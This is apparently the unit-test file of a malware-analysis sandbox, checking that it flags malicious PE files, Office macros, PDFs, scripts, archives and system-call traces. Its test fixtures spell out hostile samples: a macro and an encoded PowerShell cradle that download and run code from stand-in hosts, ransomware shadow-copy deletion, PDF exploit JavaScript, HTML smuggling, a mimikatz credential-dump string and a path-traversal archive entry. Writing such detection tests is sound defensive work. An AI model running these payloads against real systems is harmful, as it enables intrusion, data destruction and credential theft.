import base64
import io
import json
import os
import struct
import subprocess
import sys
import unittest
import zipfile
import zlib
from contextlib import redirect_stdout

from malware_sandbox import SandboxConfig, analyze_bytes, analyze_file, docker_available, run_dynamic
from malware_sandbox.cli import main
from malware_sandbox.dynamic import docker_command
from malware_sandbox.filetype import detect
from malware_sandbox.indicators import decode_powershell_command
from malware_sandbox.office import decompress_vba, extract_vba
from malware_sandbox.pe import parse_pe
from malware_sandbox.signatures import EICAR
from malware_sandbox.strings import extract_iocs, extract_strings, shannon_entropy
from malware_sandbox.trace import analyze_trace, parse_strace

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SAMPLES = os.path.join(ROOT, "samples")


def rules(report):
    """Rules that fired anywhere in a report tree."""
    found = {f.rule for f in report.findings}
    for child in report.children:
        found |= rules(child)
    return found


def build_pe(imports, section_names=(".text", ".rdata"), entry_section=0, timestamp=1_600_000_000):
    """Build a small but structurally valid PE32 image with the given kernel32 imports."""
    file_align = 0x200
    n_sections = len(section_names)
    headers_size = file_align
    # Lay out the import table in the last section.
    idata_rva = 0x1000 * n_sections
    dll_name = b"kernel32.dll\x00"
    descriptors_size = 20 * 2
    ilt_off = descriptors_size
    ilt_size = 4 * (len(imports) + 1)
    names_off = ilt_off + ilt_size
    hint_names = b""
    ilt = b""
    for name in imports:
        ilt += struct.pack("<I", idata_rva + names_off + len(hint_names))
        entry = b"\x00\x00" + name.encode() + b"\x00"
        hint_names += entry + (b"\x00" if len(entry) % 2 else b"")
    ilt += b"\x00\x00\x00\x00"
    dll_off = names_off + len(hint_names)
    descriptor = struct.pack("<IIIII", idata_rva + ilt_off, 0, 0, idata_rva + dll_off, idata_rva + ilt_off)
    idata = descriptor + b"\x00" * 20 + ilt + hint_names + dll_name
    sections = []
    body = b""
    for i, name in enumerate(section_names):
        content = idata if i == n_sections - 1 else b"\x90" * 0x100
        raw = content + b"\x00" * (-len(content) % file_align)
        sections.append((name, 0x1000 * (i + 1), len(content), len(raw), headers_size + len(body)))
        body += raw
    # The import table section must sit at idata_rva.
    name, _, vsize, rsize, rptr = sections[-1]
    sections[-1] = (name, idata_rva, vsize, rsize, rptr)

    dos = bytearray(b"MZ" + b"\x00" * 0x3E)
    struct.pack_into("<I", dos, 0x3C, 0x40)
    coff = struct.pack("<HHIIIHH", 0x14C, n_sections, timestamp, 0, 0, 224, 0x0102)
    opt = bytearray(224)
    struct.pack_into("<H", opt, 0, 0x10B)
    struct.pack_into("<I", opt, 16, sections[entry_section][1])  # entry point
    struct.pack_into("<I", opt, 28, 0x400000)
    struct.pack_into("<II", opt, 32, 0x1000, file_align)
    struct.pack_into("<H", opt, 68, 2)  # GUI
    struct.pack_into("<H", opt, 70, 0x140)  # ASLR + DEP
    struct.pack_into("<I", opt, 92, 16)
    struct.pack_into("<II", opt, 96 + 8, idata_rva, len(idata))
    table = b""
    for i, (name, vaddr, vsize, rsize, rptr) in enumerate(sections):
        chars = 0x60000020 if i == 0 else 0x40000040
        table += struct.pack("<8sIIIIIIHHI", name.encode()[:8], vsize, vaddr, rsize, rptr, 0, 0, 0, 0, chars)
    header = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + table
    return header + b"\x00" * (headers_size - len(header)) + body


def compress_vba_literals(text: bytes) -> bytes:
    """MS-OVBA container made only of literal tokens (valid, just not smaller)."""
    out = b"\x01"
    for start in range(0, len(text), 4096):
        chunk = text[start:start + 4096]
        body = b""
        for i in range(0, len(chunk), 8):
            body += b"\x00" + chunk[i:i + 8]
        header = 0x8000 | 0x3000 | (len(body) + 2 - 3)
        out += struct.pack("<H", header) + body
    return out


MACRO = (b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n'
         b'  Set sh = CreateObject("WScript.Shell")\r\n'
         b'  sh.Run "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.5/a\')"\r\n'
         b"End Sub\r\n")


def build_docm(external_template=None):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w:document><w:body>Enable content to view</w:body></w:document>")
        zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0junk" + compress_vba_literals(MACRO) + b"junk")
        if external_template:
            zf.writestr("word/_rels/settings.xml.rels",
                        f'<Relationships><Relationship Id="rId1" Type="attachedTemplate" '
                        f'Target="{external_template}" TargetMode="External"/></Relationships>')
    return buf.getvalue()


def build_pdf(js, compress=False):
    if compress:
        stream = zlib.compress(js.encode())
        js_obj = (b"3 0 obj\n<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(stream)) + stream + b"\nendstream\nendobj\n"
        action = b"<< /S /JavaScript /JS 3 0 R >>"
    else:
        js_obj = b""
        action = b"<< /S /JavaScript /JS (" + js.encode() + b") >>"
    return (b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction " + action + b" >>\nendobj\n"
            b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n" + js_obj + b"%%EOF\n")


def zip_of(members, encrypt=False):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    data = bytearray(buf.getvalue())
    if encrypt:  # set the "encrypted" flag bit in every local and central header
        for sig, flag_off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            pos = data.find(sig)
            while pos != -1:
                data[pos + flag_off] |= 1
                pos = data.find(sig, pos + 4)
    return bytes(data)


class FileTypeTests(unittest.TestCase):
    def test_magic_detection(self):
        self.assertEqual(detect(build_pe(["ExitProcess"])).kind, "pe")
        self.assertEqual(detect(b"%PDF-1.4\n...").kind, "pdf")
        self.assertEqual(detect(build_docm()).kind, "ooxml")
        self.assertEqual(detect(zip_of({"a.txt": "x"})).kind, "zip")
        self.assertEqual(detect(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100).kind, "ole")
        self.assertEqual(detect(b"#!/bin/bash\necho hi\n").kind, "bash")
        self.assertEqual(detect(b"Write-Host hi", "x.ps1").kind, "powershell")
        self.assertEqual(detect(b"\x00\x01\x02\x03" * 100).kind, "binary")

    def test_real_elf(self):
        with open(sys.executable, "rb") as fh:
            data = fh.read()
        if not data.startswith(b"\x7fELF"):
            self.skipTest("interpreter is not an ELF binary")
        report = analyze_bytes(data, "python")
        self.assertEqual(report.file_type, "elf")
        self.assertIn(report.details["class"], ("ELF32", "ELF64"))
        self.assertEqual(report.verdict, "clean")


class StringsTests(unittest.TestCase):
    def test_entropy(self):
        self.assertEqual(shannon_entropy(b"aaaa"), 0.0)
        self.assertAlmostEqual(shannon_entropy(bytes(range(256))), 8.0)

    def test_strings_and_iocs(self):
        data = b"\x00\x01http://evil.example.ru/payload.bin\x00\x01" + "C:\\Users\\Public\\x.exe".encode("utf-16-le")
        strings = extract_strings(data)
        self.assertIn("http://evil.example.ru/payload.bin", strings)
        self.assertIn("C:\\Users\\Public\\x.exe", strings)
        iocs = extract_iocs("\n".join(strings) + "\nbeacon 8.8.4.4 and 10.0.0.1 HKCU\\Software\\Run\\x")
        self.assertEqual(iocs["ips"], ["8.8.4.4"])  # private address dropped
        self.assertIn("evil.example.ru", iocs["domains"])
        self.assertTrue(iocs["registry_keys"])


class PETests(unittest.TestCase):
    def test_parses_imports_and_sections(self):
        info = parse_pe(build_pe(["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]))
        self.assertEqual(info.machine, "x86")
        self.assertEqual([s.name for s in info.sections], [".text", ".rdata"])
        self.assertEqual(info.imports["kernel32.dll"], ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"])

    def test_injection_and_packer_heuristics(self):
        pe = build_pe(["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "LoadLibraryA", "GetProcAddress"],
                      section_names=("UPX0", "UPX1"), entry_section=1)
        hit = rules(analyze_bytes(pe, "a.exe"))
        self.assertTrue({"api_process_injection", "packer_sections", "minimal_imports",
                         "entry_point_not_executable"} <= hit, hit)

    def test_benign_pe_is_clean(self):
        imports = ["ExitProcess", "GetStdHandle", "WriteFile", "GetCommandLineW", "HeapAlloc", "HeapFree",
                   "GetLastError", "CloseHandle", "CreateFileW", "ReadFile", "GetModuleHandleW"]
        report = analyze_bytes(build_pe(imports), "tool.exe")
        self.assertEqual(report.verdict, "clean", [f.description for f in report.findings])

    def test_malformed_pe(self):
        self.assertIn("pe_malformed", rules(analyze_bytes(build_pe(["ExitProcess"])[:300], "x.exe")))

    def test_disguised_executable(self):
        hit = rules(analyze_bytes(build_pe(["ExitProcess"]), "invoice.pdf.exe"))
        self.assertIn("double_extension", hit)
        hit = rules(analyze_bytes(build_pe(["ExitProcess"]), "invoice.pdf"))
        self.assertIn("extension_mismatch", hit)


class OfficeTests(unittest.TestCase):
    def test_decompress_spec_example(self):
        # Example from the MS-OVBA specification, section 3.2.
        compressed = bytes.fromhex(
            "01 2F B0 00 23 61 61 61 62 63 64 65 82 66 00 70 61 67 68 69 6A 01 38 08 61 6B 6C 00 30 6D 6E 6F 70 06 "
            "71 02 70 04 10 72 73 74 75 76 10 77 78 79 7A 00 3C")
        self.assertEqual(decompress_vba(compressed),
                         b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa")

    def test_extract_vba(self):
        self.assertEqual(extract_vba(b"xx" + compress_vba_literals(MACRO) + b"yy"), [MACRO.decode()])

    def test_macro_document(self):
        report = analyze_bytes(build_docm(), "report.docm")
        hit = rules(report)
        self.assertTrue({"vba_macros", "auto_exec_macro", "shell_object", "download_cradle", "hidden_powershell"} <= hit, hit)
        self.assertEqual(report.details["vba_modules"][0]["name"], "ThisDocument")
        self.assertEqual(report.verdict, "malicious")
        self.assertIn("203.0.113.5", report.iocs.get("urls", [""])[0])

    def test_template_injection(self):
        report = analyze_bytes(build_docm("http://203.0.113.9/t.dotm"), "doc.docx")
        self.assertIn("external_template", rules(report))

    def test_rtf_equation_editor(self):
        self.assertIn("equation_editor", rules(analyze_bytes(b"{\\rtf1{\\object\\objupdate{\\objclass Equation.3}"
                                                              b"\\objdata 0105}}", "a.rtf")))


class PDFTests(unittest.TestCase):
    def test_auto_javascript(self):
        hit = rules(analyze_bytes(build_pdf("app.alert('hi')"), "a.pdf"))
        self.assertTrue({"pdf_javascript", "pdf_openaction", "pdf_auto_javascript"} <= hit, hit)

    def test_javascript_in_compressed_stream(self):
        js = "var s = unescape('%u9090%u9090'); util.printf('%45000f', 1); this.exportDataObject({cName: 'a'});"
        report = analyze_bytes(build_pdf(js, compress=True), "a.pdf")
        hit = rules(report)
        self.assertIn("pdf_js_exploit", hit)
        self.assertIn("util.printf", report.details["javascript"])

    def test_hex_escaped_names(self):
        pdf = build_pdf("app.alert(1)").replace(b"/JavaScript", b"/J#61vaScript")
        self.assertIn("pdf_javascript", rules(analyze_bytes(pdf, "a.pdf")))

    def test_plain_pdf_is_clean(self):
        pdf = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n"
        self.assertEqual(analyze_bytes(pdf, "a.pdf").verdict, "clean")


class ScriptTests(unittest.TestCase):
    def test_encoded_powershell_is_decoded(self):
        inner = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/stage2.ps1')"
        blob = base64.b64encode(inner.encode("utf-16-le")).decode()
        self.assertEqual(decode_powershell_command(blob), inner)
        report = analyze_bytes(f"powershell.exe -NoP -W Hidden -enc {blob}".encode(), "run.bat")
        hit = rules(report)
        self.assertTrue({"encoded_powershell", "hidden_powershell", "download_cradle", "dynamic_execution"} <= hit, hit)
        self.assertIn("http://198.51.100.7/stage2.ps1", report.iocs["urls"])
        self.assertEqual(report.verdict, "malicious")

    def test_ransomware_script(self):
        script = b"vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled No\r\n" \
                 b"echo Your files have been encrypted > README.txt\r\n"
        report = analyze_bytes(script, "x.bat")
        self.assertTrue({"shadow_copy_delete", "ransom_note"} <= rules(report))

    def test_benign_script_is_clean(self):
        script = b"#!/bin/sh\nset -e\nmkdir -p build\ncp src/*.txt build/\necho done\n"
        self.assertEqual(analyze_bytes(script, "build.sh").verdict, "clean")

    def test_html_smuggling(self):
        html = b"<html><body><script>var b = atob('TVqQ'); var a = document.createElement('a');" \
               b"a.download = 'invoice.iso'; a.click();</script></body></html>"
        self.assertIn("html_smuggling", rules(analyze_bytes(html, "invoice.html")))


class SignatureTests(unittest.TestCase):
    def test_eicar(self):
        report = analyze_bytes(EICAR + b"\r\n", "eicar.com")
        self.assertIn("eicar", rules(report))
        self.assertEqual(report.verdict, "malicious")

    def test_tool_strings(self):
        data = b"\x00" * 50 + b"mimikatz 2.2 sekurlsa::logonpasswords gentilkiwi" + b"\x00" * 50
        self.assertIn("sig_mimikatz", rules(analyze_bytes(data, "m.bin")))


class ContainerTests(unittest.TestCase):
    def test_zip_recursion(self):
        inner = zip_of({"payload.exe": build_pe(["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"])})
        report = analyze_bytes(zip_of({"docs/Invoice.pdf.exe": build_pe(["ExitProcess"]), "nested.zip": inner}), "a.zip")
        self.assertEqual(len(report.children), 2)
        self.assertEqual(report.children[1].children[0].name, "payload.exe")
        self.assertTrue({"double_extension", "api_process_injection"} <= rules(report))

    def test_encrypted_zip(self):
        self.assertIn("encrypted_archive", rules(analyze_bytes(zip_of({"a.exe": "x"}, encrypt=True), "a.zip")))

    def test_zip_bomb(self):
        report = analyze_bytes(zip_of({"zeros.bin": b"\x00" * 5_000_000}), "bomb.zip")
        self.assertIn("decompression_bomb", rules(report))
        self.assertEqual(report.children, [])

    def test_path_traversal(self):
        self.assertIn("path_traversal", rules(analyze_bytes(zip_of({"../../etc/cron.d/x": "x"}), "a.zip")))

    def test_email_attachments(self):
        report = analyze_file(os.path.join(SAMPLES, "phishing", "invoice_malware.eml"))
        self.assertEqual(report.file_type, "email")
        self.assertEqual([c.name for c in report.children], ["Invoice_10293.pdf.exe"])
        self.assertIn("double_extension", rules(report))
        self.assertEqual(report.details["phishing"]["verdict"], "phishing")

    def test_legitimate_email_is_clean(self):
        report = analyze_file(os.path.join(SAMPLES, "legitimate", "team_meeting.eml"))
        self.assertEqual(report.verdict, "clean")


STRACE = """\
101   10:00:00.000001 execve("/bin/bash", ["/bin/bash", "./sample"], 0x7ffd /* 5 vars */) = 0
101   10:00:00.000100 openat(AT_FDCWD, "/tmp/home/.ssh/authorized_keys", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
101   10:00:00.000200 openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)
101   10:00:00.000300 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD <unfinished ...>
102   10:00:00.000400 execve("/usr/bin/curl", ["curl", "-s", "http://198.51.100.1/x.sh"], 0x5 /* 5 vars */) = 0
101   10:00:00.000500 <... clone resumed>) = 102
102   10:00:00.000600 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
102   10:00:00.000700 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("198.51.100.1")}, 16) = -1 ENETUNREACH (Network is unreachable)
102   10:00:00.000800 connect(4, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
102   10:00:00.000900 +++ exited with 7 +++
101   10:00:00.001000 ptrace(PTRACE_TRACEME) = -1 EPERM (Operation not permitted)
101   10:00:00.001100 execve("/tmp/.x", ["/tmp/.x"], 0x5 /* 5 vars */) = 0
101   10:00:00.001200 unlinkat(AT_FDCWD, "./sample", 0) = 0
101   10:00:00.001300 --- SIGCHLD {si_signo=SIGCHLD} ---
"""


class TraceTests(unittest.TestCase):
    def test_parse(self):
        calls = parse_strace(STRACE)
        self.assertEqual([c.call for c in calls][:4], ["execve", "openat", "openat", "execve"])
        clone = next(c for c in calls if c.call == "clone")
        self.assertEqual(clone.ret, "102")
        self.assertEqual(next(c for c in calls if c.call == "connect").errno, "ENETUNREACH")

    def test_behaviors(self):
        findings, behavior = analyze_trace(STRACE)
        hit = {f.rule for f in findings}
        self.assertTrue({"persist_ssh", "read_password", "spawn_curl", "network_connect", "anti_debug",
                         "exec_dropped", "self_delete"} <= hit, hit)
        self.assertEqual(behavior.network, ["connect 198.51.100.1:443 (ENETUNREACH)"])
        self.assertEqual(behavior.process_count, 2)

    def test_real_strace_output(self):
        # Parse genuine strace output of a harmless command on this machine.
        if subprocess.run(["which", "strace"], capture_output=True).returncode:
            self.skipTest("strace not installed")
        proc = subprocess.run(["strace", "-f", "-tt", "-e", "trace=%process,%file", "-o", "/dev/stdout",
                               "/bin/sh", "-c", "cat /etc/hostname >/dev/null; true"],
                              capture_output=True, text=True)
        if proc.returncode or "execve" not in proc.stdout:
            self.skipTest("ptrace not permitted here")
        calls = parse_strace(proc.stdout)
        self.assertEqual(calls[0].call, "execve")
        self.assertTrue(any(c.call == "execve" and c.strings()[0].endswith("cat") for c in calls))


class DynamicTests(unittest.TestCase):
    def test_docker_command_is_hardened(self):
        cmd = docker_command(SandboxConfig(runtime="runsc"), "sh", "/s", "/o", "c1")
        joined = " ".join(cmd)
        for flag in ("--network none", "--read-only", "--cap-drop ALL", "--security-opt no-new-privileges",
                     "--user 1000:1000", "--pids-limit", "--memory 256m", "-v /s:/sample:ro", "--runtime runsc"):
            self.assertIn(flag, joined)
        self.assertNotIn("--privileged", joined)
        self.assertEqual(cmd[-2:], ["sh", "30"])

    def test_windows_binary_is_not_executed(self):
        result = run_dynamic(build_pe(["ExitProcess"]), "a.exe", SandboxConfig(docker="definitely-not-docker"))
        self.assertFalse(result["executed"])
        self.assertIn("static analysis only", result["reason"])

    def test_missing_docker(self):
        result = run_dynamic(b"#!/bin/sh\necho hi\n", "a.sh", SandboxConfig(docker="definitely-not-docker"))
        self.assertFalse(result["executed"])

    @unittest.skipUnless(os.environ.get("SANDBOX_DOCKER_TESTS") and docker_available(),
                         "set SANDBOX_DOCKER_TESTS=1 with Docker and the sandbox image to run")
    def test_detonation(self):
        with open(os.path.join(SAMPLES, "sandbox", "fake_dropper.sh"), "rb") as fh:
            result = run_dynamic(fh.read(), "fake_dropper.sh", SandboxConfig(timeout=20))
        self.assertTrue(result["executed"], result.get("reason"))
        hit = {f.rule for f in result["findings"]}
        self.assertTrue({"network_connect", "self_delete", "exec_dropped", "persist_shell"} <= hit, hit)
        self.assertIn("ENETUNREACH", result["behavior"]["network"][0])

    @unittest.skipUnless(os.environ.get("SANDBOX_DOCKER_TESTS") and docker_available(),
                         "set SANDBOX_DOCKER_TESTS=1 with Docker and the sandbox image to run")
    def test_timeout_kills_sample(self):
        result = run_dynamic(b"#!/bin/bash\nwhile :; do :; done\n", "spin.sh", SandboxConfig(timeout=3))
        self.assertTrue(result["executed"], result.get("reason"))
        self.assertTrue(result["timed_out"])


class CLITests(unittest.TestCase):
    def test_json_and_exit_code(self):
        out = io.StringIO()
        with redirect_stdout(out):
            code = main(["analyze", os.path.join(SAMPLES, "sandbox", "fake_dropper.sh"), "--json"])
        data = json.loads(out.getvalue())
        self.assertEqual(code, 1)
        self.assertEqual(data["verdict"], "malicious")
        self.assertEqual(data["file_type"], "bash")
        self.assertTrue(data["findings"])

    def test_text_output_for_directory(self):
        out = io.StringIO()
        with redirect_stdout(out):
            code = main(["analyze", os.path.join(SAMPLES, "legitimate"), "--no-color"])
        self.assertEqual(code, 0)
        self.assertEqual(out.getvalue().count(": CLEAN"), 3)


if __name__ == "__main__":
    unittest.main()
